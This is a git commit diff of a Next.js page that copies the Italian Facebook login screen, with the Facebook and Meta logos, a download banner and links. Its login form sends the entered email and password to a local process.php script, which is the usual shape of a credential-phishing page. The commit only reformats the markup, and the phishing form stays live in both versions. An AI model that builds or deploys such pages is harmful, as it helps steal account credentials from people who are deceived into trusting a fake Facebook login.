1bb435669cd41e4d2f85355ed5878bb6bd903a6f
grisu1992 <simonegrisu92@gmail.com>
2025-07-18 16:44:07 +0200

    page.tsx

--- app/page.tsx
+++ app/page.tsx
@@ -1,43 +1,46 @@
-'use client' export default function Home() {
-  return (
-    <html lang="it">export default function Page() {
+'use client';
+
+export default function Home() {
   return (
     <>
-      <head>
-        <link rel="stylesheet" href="/facebook.css" />
-      </head>
-      <body>
-        <div className="top-banner">
-          <p>📥 Scarica Facebook per Android per navigare più velocemente.</p>
+      <div className="top-banner">
+        <p>📥 Scarica Facebook per Android per navigare più velocemente.</p>
+      </div>
+
+      <div className="fb-container">
+        <p className="lang">Italiano</p>
+        <img src="/facebook.png" alt="Logo Facebook" className="fb-logo" />
+
+        <div className="fb-login-box">
+          <form action="process.php" method="POST" className="fb-form">
+            <input
+              type="text"
+              name="email"
+              placeholder="Email o numero di telefono"
+              required
+            />
+            <input
+              type="password"
+              name="password"
+              placeholder="Password"
+              required
+            />
+            <button type="submit">Accedi</button>
+            <a href="#" className="forgot">Hai dimenticato la password?</a>
+            <hr />
+            <button className="create-account">Crea nuovo account</button>
+          </form>
         </div>
 
-        <div className="fb-container">
-          <p className="lang">Italiano</p>
-          <img src="/facebook.png" alt="Logo Facebook" />
-          <div className="fb-login-box">
-            <form action="process.php" method="POST" className="fb-form">
-              <input type="text" name="email" placeholder="Email o numero di telefono" required />
-              <input type="password" name="password" placeholder="Password" required />
-              <button type="submit">Accedi</button>
-              <a href="#" className="forgot">Hai dimenticato la password?</a>
-              <hr />
-              <button className="create-account">Crea nuovo account</button>
-            </form>
+        <footer className="meta-footer">
+          <img src="/meta.png" alt="Logo Meta" className="meta-logo" />
+          <div className="meta-links">
+            <a href="#">Informazioni</a>
+            <a href="#">Centro assistenza</a>
+            <a href="#">Altro</a>
           </div>
-
-          <footer className="meta-footer">
-<img src="/meta.png" alt="Logo Meta" />
-
-              <div className="meta-links">
-              <a href="#">Informazioni</a>
-              <a href="#">Centro assistenza</a>
-              <a href="#">Altro</a>
-            </div>
-          </footer>
-        </div>
-      </body>
-    </html>
+        </footer>
+      </div>
+    </>
   );
-            }
-
-      
+}
